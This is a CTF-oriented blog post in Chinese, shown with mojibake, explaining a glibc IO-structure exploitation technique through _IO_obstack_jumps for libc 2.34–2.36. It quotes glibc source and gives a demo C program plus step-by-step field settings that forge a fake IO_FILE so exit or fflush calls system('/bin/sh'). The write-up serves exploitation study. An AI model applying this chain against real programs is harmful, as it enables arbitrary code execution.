---
title: House_of_ç´ç‘Ÿçµç¶
author: Aapcer
date: 2023-02-07 13:37:00 +0800
categories: [æ”»å‡»æ–¹å¼åˆ©ç”¨, House_of_ç´ç‘Ÿçµç¶]
tags: [House_of_ç´ç‘Ÿçµç¶, PWN, IOåˆ©ç”¨]
math: true
mermaid: true
comments: false
---

## å¼•è¨€

> è¿™å‡ å¤©ä¸Šçœ‹é›ªçœ‹æ–‡ç« ï¼Œå‘ç°libcå±…ç„¶éƒ½å‡ºåˆ°2.37äº†ï¼Œå»å¹´2.36çš„é¢˜ç›®éƒ½æ²¡åšè¿‡å¤šå°‘ï¼ˆæˆ‘æ˜¯FWğŸ˜­ï¼‰ï¼Œå¤§ä½¬è¯´2.37ä¹‹ålibcæ”¹äº†å¾ˆå¤šï¼Œæ²¡æ³•ç”¨House_of_Appleæ‰“äº†ï¼Œäºæ˜¯ä»‹ç»äº†ä¸€ç§æ–°çš„æ‰“æ³•ï¼Œå«House_of_ç´ç‘Ÿçµç¶

å¤§ä½¬åŸè¯ï¼š

æˆ‘è®¤ä¸ºGNUä¸‹ä¸€æ­¥ä¼šæŒ‰2.37çš„æ€è·¯ä¸æ–­ä¿®æ”¹IOï¼Œä»¥å‰å¾ˆå¤šæ–¹æ³•éƒ½ä¼šæ¸æ¸å¤±æ•ˆï¼Œåœ¨æ­¤æˆ‘ä¹Ÿå†³å®šå°†å‡ ä¸ª2.37ä»¥åå¤±æ•ˆçš„æ”»å‡»é“¾å…¬å¸ƒå‡ºæ¥ã€‚ï¼ˆtqlï¼‰

## åˆ©ç”¨æ¡ä»¶

- å¯çŸ¥`heap_base`å’Œ`lib_base`
- èƒ½æ‰“ä¸€æ¬¡`largebin_attack`æƒ³åŠæ³•è®©å…¶èµ°æˆ‘ä»¬ä¼ªé€ çš„IO
- ç¨‹åºæ‰§è¡ŒIOçš„æœ‰å…³æ“ä½œï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼šä»`main`å‡½æ•°è¿”å›ã€è°ƒç”¨`exit`å‡½æ•°ã€é€šè¿‡`__malloc_assert`è§¦å‘

## æœ‰å…³libcç‰ˆæœ¬çš„é—®é¢˜

> **æ­¤æ”»å‡»æ–¹å¼å¯ä»¥åœ¨2.34-2.36ä½¿ç”¨**ï¼Œå¤§ä½¬è¯´çœ‹æºç åº”è¯¥å¯ä»¥

## æ”»å‡»è·¯å¾„

ä¸»è¦æ˜¯åˆ©ç”¨`_IO_obstack_jumps`ä¸­çš„ `_IO_obstack_xsputn`å‡½æ•°

```
_IO_obstack_xsputn
        obstack_grow (obstack, data, n);;
                _obstack_newchunk (__o, __len);
                         new_chunk = CALL_CHUNKFUN (h, new_size);
                                     (*(h)->chunkfun)((h)->extra_arg, (size))
```

## æœ‰å…³ç»“æ„ä½“

### `_IO_obstack_jumps`è·³è½¬è¡¨

åªæœ‰ä¸¤ä¸ªè¡¨é¡¹è¢«åˆå§‹åŒ–äº†ï¼Œåˆ†åˆ«ä¸º_IO_obstack_overflowå’Œ\_IO_obstack_xsputn

```c
/* the jump table.  */
const struct _IO_jump_t _IO_obstack_jumps libio_vtable attribute_hidden =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, NULL),
  JUMP_INIT(overflow, _IO_obstack_overflow),
  JUMP_INIT(underflow, NULL),
  JUMP_INIT(uflow, NULL),
  JUMP_INIT(pbackfail, NULL),
  JUMP_INIT(xsputn, _IO_obstack_xsputn),
  JUMP_INIT(xsgetn, NULL),
  JUMP_INIT(seekoff, NULL),
  JUMP_INIT(seekpos, NULL),
  JUMP_INIT(setbuf, NULL),
  JUMP_INIT(sync, NULL),
  JUMP_INIT(doallocate, NULL),
  JUMP_INIT(read, NULL),
  JUMP_INIT(write, NULL),
  JUMP_INIT(seek, NULL),
  JUMP_INIT(close, NULL),
  JUMP_INIT(stat, NULL),
  JUMP_INIT(showmanyc, NULL),
  JUMP_INIT(imbue, NULL)
};
```

### `_IO_obstack_file`ç»“æ„ä½“

è¿™ä¸ªç»“æ„ä½“å’Œä¸€èˆ¬çš„IO_FILE_PLUSæ²¡å•¥åŒºåˆ«ï¼Œå°±æ˜¯åœ¨ä¸‹é¢å¤šäº†ä¸€ä¸ªæŒ‡å‘obstackç»“æ„ä½“çš„æŒ‡é’ˆ

```c
struct _IO_obstack_file
{
  struct _IO_FILE_plus file;
  struct obstack *obstack;
};
 
struct obstack          /* control current object in current chunk */
{
  long chunk_size;              /* preferred size to allocate chunks in */
  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
  char *object_base;            /* address of object we are building */
  char *next_free;              /* where to add next char to current object */
  char *chunk_limit;            /* address of char after current chunk */
  union
  {
    PTR_INT_TYPE tempint;
    void *tempptr;
  } temp;                       /* Temporary for some macros.  */
  int alignment_mask;           /* Mask of alignment for each object. */
  /* These prototypes vary based on 'use_extra_arg', and we use
     casts to the prototypeless function type in all assignments,
     but having prototypes here quiets -Wstrict-prototypes.  */
  struct _obstack_chunk *(*chunkfun) (void *, long);
  void (*freefun) (void *, struct _obstack_chunk *);
  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
  unsigned maybe_empty_object : 1; /* There is a possibility that the current
                      chunk contains a zero-length object.  This
                      prevents freeing the chunk if we allocate
                      a bigger chunk to replace it. */
  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
                     handler on error, but retained for binary
                     compatibility.  */
};
```

## è°ƒç”¨é“¾åˆ†æ

### `_IO_obstack_xsputn`å‡½æ•°

```c
static size_t _IO_obstack_xsputn (FILE *fp, const void *data, size_t n)
{
  struct obstack *obstack = ((struct _IO_obstack_file *) fp)->obstack;
 
  if (fp->_IO_write_ptr + n > fp->_IO_write_end)
    {
      int size;
 
      /* We need some more memory.  First shrink the buffer to the
     space we really currently need.  */
      obstack_blank_fast (obstack, fp->_IO_write_ptr - fp->_IO_write_end);
 
      /* Now grow for N bytes, and put the data there.  */
      obstack_grow (obstack, data, n); //æ‰§è¡Œæ¬¡å‡½æ•°
 
      /* Setup the buffer pointers again.  */
      fp->_IO_write_base = obstack_base (obstack);
      fp->_IO_write_ptr = obstack_next_free (obstack);
      size = obstack_room (obstack);
      fp->_IO_write_end = fp->_IO_write_ptr + size;
      /* Now allocate the rest of the current chunk.  */
      obstack_blank_fast (obstack, size);
    }
  else
    fp->_IO_write_ptr = __mempcpy (fp->_IO_write_ptr, data, n);
 
  return n;
}
```

### `obstack_grow`å®å®šä¹‰

```c
# define obstack_grow(OBSTACK, where, length)                      \
  __extension__                                      \
    ({ struct obstack *__o = (OBSTACK);                          \
       int __len = (length);                              \
       if (__o->next_free + __len > __o->chunk_limit)                  \
     _obstack_newchunk (__o, __len);                      \    //æ‰§è¡Œæ¬¡å‡½æ•°
       memcpy (__o->next_free, where, __len);                      \
       __o->next_free += __len;                              \
       (void) 0; })
```

### `_obstack_newchunk`å‡½æ•°

```c
void
_obstack_newchunk (struct obstack *h, int length)
{
  struct _obstack_chunk *old_chunk = h->chunk;
  struct _obstack_chunk *new_chunk;
  long new_size;
  long obj_size = h->next_free - h->object_base;
  long i;
  long already;
  char *object_base;
 
  /* Compute size for new chunk.  */
  new_size = (obj_size + length) + (obj_size >> 3) + h->alignment_mask + 100;
  if (new_size < h->chunk_size)
    new_size = h->chunk_size;
 
  /* Allocate and initialize the new chunk.  */
  new_chunk = CALL_CHUNKFUN (h, new_size); //è°ƒç”¨å‡½æ•°ä½ç½®
  if (!new_chunk)
    (*obstack_alloc_failed_handler)();
  h->chunk = new_chunk;
  new_chunk->prev = old_chunk;
  new_chunk->limit = h->chunk_limit = (char *) new_chunk + new_size;
 
  /* Compute an aligned object_base in the new chunk */
  object_base =
    __PTR_ALIGN ((char *) new_chunk, new_chunk->contents, h->alignment_mask);
 
  /* Move the existing object to the new chunk.
     Word at a time is fast and is safe if the object
     is sufficiently aligned.  */
  if (h->alignment_mask + 1 >= DEFAULT_ALIGNMENT)
    {
      for (i = obj_size / sizeof (COPYING_UNIT) - 1;
       i >= 0; i--)
    ((COPYING_UNIT *) object_base)[i]
      = ((COPYING_UNIT *) h->object_base)[i];
      /* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,
     but that can cross a page boundary on a machine
     which does not do strict alignment for COPYING_UNITS.  */
      already = obj_size / sizeof (COPYING_UNIT) * sizeof (COPYING_UNIT);
    }
  else
    already = 0;
  /* Copy remaining bytes one by one.  */
  for (i = already; i < obj_size; i++)
    object_base[i] = h->object_base[i];
 
  /* If the object just copied was the only data in OLD_CHUNK,
     free that chunk and remove it from the chain.
     But not if that chunk might contain an empty object.  */
  if (!h->maybe_empty_object
      && (h->object_base
      == __PTR_ALIGN ((char *) old_chunk, old_chunk->contents,
              h->alignment_mask)))
    {
      new_chunk->prev = old_chunk->prev;
      CALL_FREEFUN (h, old_chunk);
    }
 
  h->object_base = object_base;
  h->next_free = h->object_base + obj_size;
  /* The new chunk certainly contains no empty object yet.  */
  h->maybe_empty_object = 0;
}
```

### `CALL_CHUNKFUN`å®å®šä¹‰

å…¶ä¸­`h`è¡¨ç¤ºçš„æ˜¯æˆ‘ä»¬çš„`obstackç»“æ„ä½“æŒ‡é’ˆ`ï¼Œ`chunkfun`ï¼Œ`use_extra_arg`å’Œ`extra_arg`æ˜¯å±äºobstackç»“æ„ä½“é‡Œé¢çš„å€¼

```c
# define CALL_CHUNKFUN(h, size) \
  (((h)->use_extra_arg)                                  \
   ? (*(h)->chunkfun)((h)->extra_arg, (size))                      \  // å­˜åœ¨å‡½æ•°æŒ‡é’ˆè°ƒç”¨
   : (*(struct _obstack_chunk *(*)(long))(h)->chunkfun)((size)))
```

### è°ƒç”¨é“¾æ€»ç»“

å…¶å®å¾ˆç®€å•ï¼Œåªè¦æˆ‘ä»¬åœ¨æ„é€ çš„IO_FILEçš„vtableåé¢åŠ ä¸€ä¸ªobstackæŒ‡é’ˆï¼Œæ§åˆ¶å…¶æŒ‡å‘çš„**obstackçš„å±æ€§**å°±å¯ä»¥äº†ï¼Œå¦‚`h->chunkfun=&system`ä¸`h->extra_arg=&bin_sh`

å½“ç„¶äº†ï¼Œä¹Ÿè¦ä½ æ„é€ çš„IO_FILEèƒ½è°ƒç”¨`_IO_obstack_xsputn`å‡½æ•°

## Demoè°ƒè¯•

è¿™ä¸ªDemoæ˜¯æˆ‘æŒ‰ç…§å¤§ä½¬çš„è°ƒç”¨æ€è·¯å»å†™çš„ï¼Œèµ°çš„æ˜¯exitè°ƒç”¨IOï¼Œäº‹å…ˆå°†IO_list_allæ”¹æˆäº†æˆ‘ä»¬çš„fake_IO_FILE

> libcç‰ˆæœ¬2.34_3.2

### æºç 

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	size_t *p1 = malloc(0x420);

	size_t *fake_io;
	fake_io=p1-2;

	size_t put_addr = &puts;
	size_t lib_base = put_addr - 0x80ef0;
	size_t IO_list_all = lib_base + (0x7ffff7fb4660 - 0x7ffff7d9a000);
	size_t _IO_obstack_jumps_addr = lib_base + (0x7ffff7fb03c0 - 0x7ffff7d9a000);
	size_t sys = lib_base + (0x7ffff7deaae0 - 0x7ffff7d9a000);
	size_t bin_sh = lib_base + (0x7ffff7f71cba - 0x7ffff7d9a000);
	
	//make fake_IO
	//*fake_io = 0x800;
	*(fake_io+0x28/8)=0x1;				//fp->_IO_write_ptr > fp->_IO_write_base
	*(fake_io+0xd8/8)=_IO_obstack_jumps_addr + 0x20;// call _IO_obstack_xsputn
	*(fake_io+0xe0/8)=fake_io+0xf0/8;	//obstack
	
	size_t *fake_obstack = fake_io+0xf0/8;
	//make obstack
	*(fake_obstack+0x38/8)=sys;			//h->chunkfun
	*(fake_obstack+0x48/8)=bin_sh;		//h->extra_arg
	*(fake_obstack+0x50/8)=1;			//h->use_extra_arg
	
    //change IO_list_all
	size_t *p2 = (size_t *)IO_list_all;
	*p2 = fake_io;
	exit(0);

}
```

ç›´æ¥å¼€è°ƒ

### æ„é€ FAKE_IO_FILEç»“æ„ä½“

![image-20230207211129095](/post/20230207/image-20230207211129095.png)

å¯ä»¥çœ‹åˆ°vtableæ”¹æˆäº†åˆ°æ—¶å€™å¯ä»¥è°ƒç”¨`_IO_obstack_xsputn`å‡½æ•°

obstackç»“æ„ä½“å°±åˆšå¥½ä¹Ÿåœ¨è¿™ä¸ªå †å—å†…ï¼Œå°±æ”¾åœ¨äº†ä¸‹é¢ï¼Œ**è¿™ä¸ªç»“æ„ä½“æ”¾åœ¨å“ªæ²¡ä»€ä¹ˆæ‰€è°“**ï¼Œå¦ä¸€ä¸ªå †å—ä¹Ÿè¡Œ

### æ„é€ obstackç»“æ„ä½“

![image-20230207211332358](/post/20230207/image-20230207211332358.png)

åˆšå¥½ä¹Ÿæ˜¯åœ¨å †å—å†…éƒ¨ï¼Œå…¶å®æ”¾å“ªæ— æ‰€è°“

æ”¹IO_list_allå°±ä¸çœ‹äº†ï¼Œè¿™ä¸ªæŒ‰ç…§æ­£å¸¸æ¥è¯´æ˜¯é€šè¿‡largebinå†™ä¸€ä¸ªå †åœ°å€çš„

### è·Ÿè¸ªåˆ°IO_flush_all_lockå‡†å¤‡è°ƒç”¨_IO_obstack_xsputn

![image-20230207211628743](/post/20230207/image-20230207211628743.png)

### è°ƒç”¨_obstack_newchunk

![image-20230207211727006](/post/20230207/image-20230207211727006.png)

å¯ä»¥çœ‹åˆ°RDIæ˜¯æˆ‘ä»¬çš„obstackæŒ‡é’ˆ

### è°ƒç”¨CALL_CHUNKFUNæ¥è¿è¡Œsystem

![image-20230207211848059](/post/20230207/image-20230207211848059.png)

## FAKE_IO_FILEä¼ªé€ 

é‚£FAKE_IOå¦‚ä½•ä¼ªé€ æ‰å¯ä»¥è°ƒç”¨`_IO_obstack_xsputn`å‡½æ•°å‘¢

### èµ°exitçš„

å¯¹`fp`çš„è®¾ç½®å¦‚ä¸‹ï¼š

- `vtable`è®¾ç½®ä¸º`_IO_obstack_jumps`åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨`_IO_obstack_xsputn`å³å¯ï¼Œä¹Ÿå°±æ˜¯***(fp+0xd8)=_IO_obstack_jumpsåœ°å€ï¼ˆåŠ å‡åç§»ï¼‰**
- `fp->_mode` <= 0ï¼Œä¹Ÿå³***(fp+0xc0) = 0**
- `fp->_IO_write_ptr ` >`fp->_IO_write_base`ï¼Œä¹Ÿå³***(fp+0x28) > *(fp+0x20)**
- `fp->h` = åœ°å€Aï¼Œä¹Ÿå³***(fp+0xe0)=åœ°å€A**
- `fp->h->chunkfun`=&systemï¼Œä¹Ÿå³***(åœ°å€A+0x38)=&system**
- `fp->h->extra_arg`=&bin_shï¼Œä¹Ÿå³***(åœ°å€A+0x48)=&bin_sh**
- `fp->h->use_extra_arg`=1ï¼Œä¹Ÿå³***(åœ°å€A+0x50)=1**

### èµ°fflushçš„

æœ‰å¾ˆå¤šï¼Œè¿™é‡Œåªè¯´ä¸€ç§

å¯¹`fp`çš„è®¾ç½®å¦‚ä¸‹ï¼š

- `_flags`è®¾ç½®ä¸º`~(2 | 0x8 | 0x800)`ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶`rdi`ï¼Œè®¾ç½®ä¸º`0`å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—`shell`ï¼Œå¯è®¾ç½®ä¸º`sh;`ï¼Œæ³¨æ„å‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼
- `vtable`è®¾ç½®ä¸º`_IO_obstack_jumps`åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨`_IO_obstack_xsputn`å³å¯ï¼Œä¹Ÿå°±æ˜¯***(fp+0xd8)=_IO_obstack_jumpsåœ°å€ï¼ˆåŠ å‡åç§»ï¼‰**
- `fp->h` = åœ°å€Aï¼Œä¹Ÿå³***(fp+0xe0)=åœ°å€A**
- `fp->h->chunkfun`=&systemï¼Œä¹Ÿå³***(åœ°å€A+0x38)=&system**
- `fp->h->extra_arg`=&bin_shï¼Œä¹Ÿå³***(åœ°å€A+0x48)=&bin_sh**
- `fp->h->use_extra_arg`=1ï¼Œä¹Ÿå³***(åœ°å€A+0x50)=1**

### èµ°__malloc_assert

> æœªå®Œå·¥ï¼Œhouse_of_catè¿˜ä¸æ˜¯å¾ˆç†ŸXDï¼Œä¸è¿‡æµ…æµ…çœ‹äº†ä¸€ä¸‹è°ƒç”¨é“¾å’Œfflushå·®ä¸å¤šå‘€....

```c
static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
         const char *function)
{
  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
             __progname, __progname[0] ? ": " : "",
             file, line,
             function ? function : "", function ? ": " : "",
             assertion);
  fflush (stderr);
  abort ();
}
```

## æ€»ç»“

> æœ€åæ„Ÿè°¢å¤§ä½¬æä¾›çš„æ€è·¯ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»¥åä¸èƒ½æ‰“wide_dataäº†ï¼Œå…ˆæŠŠè¿™ä¸ªå­¦ä¸€ä¸‹æŠŠï¼Œä¸è¿‡å…¶å®è¯´å®è¯çœ‹ä¸Šå»å’Œæ‰“wide_dataå·®ä¸å¤šï¼Œåªä¸è¿‡æ˜¯åˆ©ç”¨äº†å…¶ä»–çš„ç»“æ„ä½“å’Œå­—æ®µè€Œå·²
